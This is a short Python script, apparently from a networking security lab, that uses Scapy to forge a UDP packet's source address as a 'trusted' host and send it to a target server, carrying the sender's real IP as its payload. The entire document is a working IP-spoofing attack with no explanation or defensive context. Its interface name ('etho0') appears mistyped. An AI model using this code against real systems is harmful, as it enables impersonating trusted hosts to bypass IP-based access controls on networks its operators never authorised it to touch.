from scapy.all import *

def main():
    #configuration 
    IFACE = "etho0"
    TARGET_SERVER_IP = "10.0.0.3"
    TRUSTED_IP = "10.2.4.10"
    MY_REAL_IP = "10.0.0.2"
    UDP_PORT = 13337
    
    ip_layer = IP(src= TRUSTED_IP, dst = TARGET_SERVER_IP)
    udp_layer = UDP(sport = UDP_PORT, dport = UDP_PORT)
    payload = MY_REAL_IP
    spoofed_packet = ip_layer / udp_layer / payload

    send(spoofed_packet, iface = IFACE)

if __name__ == "__main__":
    main()
